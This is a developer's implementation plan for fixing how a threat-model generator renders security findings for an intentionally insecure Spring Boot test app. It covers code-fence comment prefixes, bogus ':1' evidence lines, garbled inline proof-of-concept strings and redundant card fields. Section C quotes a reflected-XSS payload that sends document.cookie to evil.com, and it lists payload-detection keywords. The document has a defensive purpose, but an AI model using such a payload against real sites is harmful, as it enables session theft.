# Implementation plan — finding presentation cleanup (formatting + verbosity)

**Status:** PARTIALLY IMPLEMENTED 2026-07-13 (uncommitted, `dev`). See
"Implementation record" at the bottom — the code-formatting root cause was
mis-located in §C and is corrected there; C/D landed, A/B still open.
**Owner:** TBD
**Prereqs read:** self-contained; no prior session context needed.

Addresses two review complaints about the rendered findings register:
"code is not shown as code" (formatting) and "too much technical detail per
finding" (verbosity). Split into four workstreams — **A/B are mechanical &
low-risk; C is medium; D is a presentation-design decision that needs product
sign-off (do not ship it blind).**

---

## 0. Reference model — how to re-verify (do this FIRST in the clean session)

The reference fixture is the intentionally-insecure app:

- **Repo:** `/home/mrohr/1/insecure-spring-app` (Spring Boot; ground truth in
  its `EXPECTED-FINDINGS.md`).
- **Rendered output under test:** `/home/mrohr/1/insecure-spring-app/docs/security/threat-model.md`
  (built by `scripts/compose_threat_model.py`; `.fragments/` + `threat-model.yaml`
  are the inputs). Re-render after any change with:
  `python3 scripts/compose_threat_model.py --output-dir <that dir> --strict`

**Baseline defect counts (captured 2026-07-13; re-run to confirm before fixing
and expect them to drop to ~0 after):**

```bash
MD=/home/mrohr/1/insecure-spring-app/docs/security/threat-model.md
grep -c '^// Dockerfile:' "$MD"                       # A: 7  (→ should be `# Dockerfile:`)
grep -cE '\.java:1\b' "$MD"                            # B: ~15 propagated `:1` refs
grep -oE 'displayName=<script[^"]{0,40}' "$MD"|head -1 # C: garbled inline PoC still present
grep -cE '^\*\*Root cause:\*\*' "$MD"                  # D: 23 cards w/ templated Root cause
```

**Canonical bad card to eyeball — F-031** (`#### F-031 · Reflected XSS
(OutputPreviewController.java:1)`): exhibits ALL four issues at once — `:1`
location, a code block showing the `package`/`import` lines (not the sink), a
garbled inline PoC, and the redundant Issue/Root-cause/Evidence stack. Use it as
the acceptance eyeball for A–D.

> Note: F-031 is already correctly marked `◌ ambiguous` and excluded from the
> "confirmed-exploitable" narrative (landed on `dev`: commit a0e1401, "P2a").
> This plan is orthogonal — it fixes how such a card *renders*, not its rating.

---

## A. Language-aware code-fence comment prefix  (mechanical)

**Defect:** the fence header is hardcoded to `//` regardless of language, so a
Dockerfile/YAML/shell snippet renders `// Dockerfile:13` — `//` is not a valid
comment there.

**Exact site — `scripts/compose_threat_model.py:14258`:**
```python
snippet_block = f"```{lang}\n// {ev_file}:{ev_line}\n{snippet_text}\n```"
```
`lang` comes from `_lang_class_for_file(ev_file)` (line 13200, strips the
`language-` prefix).

**Fix:** add `_comment_prefix_for_lang(lang) -> str` and build the header with it.
Comment syntax by language (from the `_lang_class_for_file` map at 13208):

| prefix | languages |
|---|---|
| `#`  | dockerfile, python, ruby, yaml, toml, bash (sh/env) |
| `//` | java, javascript, typescript, go, rust, scss, css* |
| `--` | sql |
| *(omit header line)* | json, markdown, html (no line-comment syntax) |

(css/scss really use `/* */`; `//` is tolerated by most highlighters — acceptable,
or special-case later.) For the omit case, drop the header line and keep the
fence; the `**Location:**` field already states file:line.

**Test:** `tests/test_compose_threat_model*.py` — a Dockerfile-evidence finding
renders `# Dockerfile:` not `// Dockerfile:`; a Java one still renders `//`.

## B. Suppress degenerate evidence locations  (mechanical)

**Defect:** a snippet anchored at `line = 1` renders a code block of the
`package`/`import` header (no security relevance) and stamps `:1` into the title
and Location. Root cause is upstream — the STRIDE analyzer wrote `line: 1` when
it could not resolve the sink (see P2a survey) — but the renderer should not
present it as if it were real evidence.

**Exact sites:**
- `_read_evidence_snippet` (`:13149`) returns a snippet for `line == 1` (guard is
  only `line < 1`). 
- The block is built unconditionally when `snippet_relevant` (`:14242`) — that
  gate checks `bool(ev_line)` but not whether the line is *degenerate*.

**Fix (renderer-side, deterministic):** treat an evidence line as degenerate when
`ev_line <= 1` **or** the resolved snippet is import/package-only (reuse the
`_is_import_line` / `_is_comment_only` logic already in
`scripts/validate_evidence_lines.py:193-199`). When degenerate:
1. do **not** emit `snippet_block` (no misleading code fence);
2. do **not** append `:1` to the card title or Location — show the file only
   (e.g. `OutputPreviewController.java` without `:1`).

Keep it renderer-local; do not try to re-resolve the true line here (that is a
STRIDE-analyzer improvement, tracked separately under P1).

**Test:** a finding with `evidence.line = 1` renders no code fence and a title
without `:1`; a finding with `line = 19` on real code renders the fence as today.

## C. Fix garbled inline PoC strings in prose  (medium)

**Defect:** payload prose mixes raw HTML and backticks and renders broken, e.g.
F-031: `displayName=<script`>fetch('//evil.com/?c='+`document.cookie`)`</script>`.

**Site:** this is *prose*, not the evidence fence — it comes from the authored
scenario/issue text and passes through `scripts/apply_prose_fixes.py`.

**Fix:** add a prose-fixer pass that detects an inline attack-payload/URL
containing angle brackets or `<script` mixed with stray backticks and either (a)
wrap the whole payload in a single backtick span with the inner backticks
stripped, or (b) lift it to its own fenced block. Conservative: only rewrite spans
that clearly contain a payload (`<script`, `javascript:`, `../`, `' OR `, `||`,
`$(`), never ordinary prose. Add unit tests in `tests/test_apply_prose_fixes*.py`
with the F-031 string as a fixture.

## D. Reduce per-finding verbosity  (DESIGN DECISION — needs sign-off)

**Defect:** every card stacks `**Issue:**` (multi-paragraph, via
`_paragraphize_issue_card` `:5012`), a **templated** `**Root cause:**` (from
`tier_root_causes` / `_derive_tier_root_causes` `:3819` — the same generic
sentence repeats across a whole severity tier; e.g. F-007's root cause is a
generic SSRF/path sentence unrelated to the finding), and `**Evidence:**` (via
`_build_evidence_claim` `:13373`) that largely restates Issue. Depth is already
severity-tuned (`_FINDING_DEPTH` `:13235`) but the field REDUNDANCY is the
problem, not the length knob.

**Why this is not mechanical:** cutting fields changes what every report shows —
which field survives (Issue vs Evidence), whether the templated Root cause stays,
and how terse "terse" is are product calls. Options to put to the owner as a
**before/after card**:

- **Option 1 (minimal):** drop the templated `Root cause` line when it is
  tier-generic (not finding-specific); keep Issue + Evidence. 
- **Option 2 (dedup):** merge Issue + Evidence into one "What & where" block
  (Issue prose + the fenced snippet), drop the restating Evidence sentence.
- **Option 3 (both):** Option 1 + Option 2 → a card of Title · Severity/Location ·
  What+where (+snippet) · Fix · Classification.

**Do NOT ship D without the owner picking an option.** Prepare the before/after
from F-006 (SQLi, a clean confirmed finding) and F-031, and get the call — mirror
how the ghost-tier and evidence-policy decisions were made this session.

## Sequencing & risk

1. **A + B first** — mechanical, deterministic, unit-testable, zero product
   latitude. Land together.
2. **C** — medium; land after A/B if the payload detector stays conservative
   (prefer leaving prose untouched over a wrong rewrite).
3. **D** — only after the owner picks an option from the before/after.

Each of A/B/C is a small, independently-committable change with tests, in the
same low-risk vein as the P2a triage/render fixes already on `dev`.

## Reference index (verified 2026-07-13)

- Fence assembly + hardcoded `//`: `compose_threat_model.py:14258`.
- Snippet read (line=1 passes): `compose_threat_model.py:13149` (`_read_evidence_snippet`).
- Fence language map: `compose_threat_model.py:13200` (`_lang_class_for_file`).
- Snippet-relevance gate: `compose_threat_model.py:14242` (`snippet_relevant`).
- Degenerate-line helpers to reuse: `validate_evidence_lines.py:193-217`
  (`_is_import_line`, `_is_comment_only`).
- Issue paragraphizer: `compose_threat_model.py:5012` (`_paragraphize_issue_card`).
- Templated root cause: `compose_threat_model.py:3819` (`_derive_tier_root_causes`),
  consumed via `tier_root_causes`.
- Evidence claim: `compose_threat_model.py:13373` (`_build_evidence_claim`).
- Severity depth knobs: `compose_threat_model.py:13235` (`_FINDING_DEPTH`).
- Prose fixer: `scripts/apply_prose_fixes.py`.
- Reference model + baseline counts: this file, §0.

---

## Implementation record (2026-07-13, uncommitted on `dev`)

Verified the plan against code + the reference report first; two §C/§D
fundstellen were wrong and are corrected here.

**Done — "code not shown as code" (broader than §C):** the garbled/over-eager
inline formatting is **not** in `apply_prose_fixes.py` — it is
`_codify_inline_identifiers` (`compose_threat_model.py:13620`). Reworked its two
ambiguous matchers from *fail-open* (wrap everything, subtract a brand allowlist)
to *fail-closed* (wrap only on positive code evidence):
- `_file_token_is_product_name` — bare `Node.js`/`Fastify.js`/`Koa.js` (JS-ext,
  Capitalised stem, no path/`:line`) are product names → not wrapped. Real file
  refs (`routes/login.ts:34`) still wrap.
- `_dotted_token_is_code` — `socket.io`/`engine.io`/`evil.com` (product/TLD
  suffix) and `e.g`/`i.e` (all-single-letter) → prose. Method calls
  (`socket.emit`, `restTemplate.getForObject`) and member chains still wrap.
- `_wrap_code_string_literals` + `_fold_code_strings_in_prose` — a code-signal
  quoted literal (SQL query, concat expr) is folded into ONE span **before**
  `_escape_dot_tld_identifiers`, so a column ref like `u.id` is never mistaken
  for the `.id` ccTLD and half-backticked mid-query. Killed the F-006
  ``on `o.owner_id` = `u.id` where `u.email` `` garble in both §8 and §3.

Reference re-render deltas: `e.g` false-backticks 27→0, half-backticked column
refs 2→0.

**Done — §D verbosity (Option 3) + two taxonomy bugs the plan missed:**
- Dropped the tier-generic `**Root cause:**` (23→0 in the reference; it was 5
  distinct strings across 38 findings, sometimes topically wrong). Only a
  finding-authored `root_cause` survives.
- Dropped the *synthesised* `**Evidence:**` restatement when a snippet follows
  (snippet is the proof); operator-authored `evidence_summary` preserved.
- **Classification/OWASP taxonomy fix** (`infer_threat_category`): the curated
  CWE→TH map is now authoritative over the noisy stored `threat_category_id`
  (was: stored short-circuits). Fixes F-006 SQLi `OAuth/OIDC·A07 → Injection·A03`
  and 12 other mislabels; added `CWE-116 → [TH-11,TH-01]` so F-031 XSS reads
  `Cross-Site Scripting (XSS)·A03`.

Tests: added codify/fold/taxonomy cases; updated two tests that pinned the old
(buggy) behaviour. Full targeted suite green (1547 passed).

**Still open:** §A (language-aware fence comment prefix — `// Dockerfile:` still
renders) and §B (degenerate `:1` evidence lines). Both mechanical; not started.
